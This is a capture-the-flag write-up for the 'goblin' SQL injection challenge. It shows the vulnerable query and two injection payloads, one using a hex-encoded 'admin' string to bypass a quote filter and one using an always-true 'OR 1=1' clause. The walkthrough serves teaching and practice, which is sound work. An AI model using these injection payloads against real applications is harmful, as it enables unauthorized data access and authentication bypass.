---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 3
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/d35d9a32-55a6-4752-a4d4-955971ba3131)

We are provided with the SQL query:

```sql
SELECT id FROM prob_goblin WHERE id='guest' AND no={$_GET[no]}
```

This time the application blocks quotation marks. It also does not directly insert user input into the `id` field.

The code also performs two conditional checks:

1. `if($result['id'])`: It checks if the statement is `True`. If yes, it prints the following message: `Hello {$result[id]}`.
2. `if($result['id'] == 'admin')`: It then checks if the `id` is set to `admin`. If yes, it prints the flag.

We want the first conditional statement to be skipped and the second one to be executed.

There are two methods.

### Method 1

In order to make the result of the first query `False`, we can provide the following URI:

```
?no=0
```

The resultant query then becomes:

```sql
SELECT id FROM prob_goblin WHERE id='guest' AND no=0
```

Since no=0 is always false, the result of the `AND` operation will always be `False`.

![2](https://github.com/Kunull/Write-ups/assets/110326359/130b241a-088d-4187-86fb-5944f1ff0503)

As expected, the `Hello {$result[id]}` message isn't printed.

In order to execute the second conditional statement, we can provide the following input:

```
?no=0 OR id=0x61646d696e
```

We are providing the Hexadecimal representation of the `admin` string.

The resultant query will be:

```sql
SELECT id FROM prob_goblin WHERE id='guest' AND no=0 OR id=0x61646d696e
```

The result of the first conditional is already `False` and because we just the `id` field to `admin`, the flag will be printed.

![3](https://github.com/Kunull/Write-ups/assets/110326359/f349d379-8a99-4e6f-b4fa-6c9b2c08e527)


### Method 2

If we provide the following input:

```
?no=no
```

The resultant query will be:

```sql
SELECT id FROM prob_goblin WHERE id='guest' AND no=no
```

The result will always be `True` since any column (`no`) compared with itself is always true.

Next, if we add an `OR` command as follows:

```
?no=no OR 1=1 ORDER BY id;
```

The resultant query will be:

```sql
SELECT id FROM prob_goblin WHERE id='guest' AND no=no OR 1=1 ORDER BY id;
```

This will print out all the rows as 1=1 is always true and anything `OR` with true is true.

![4](https://github.com/Kunull/Write-ups/assets/110326359/dbfef2c6-67a6-4d7a-9403-8a3a18bae228)
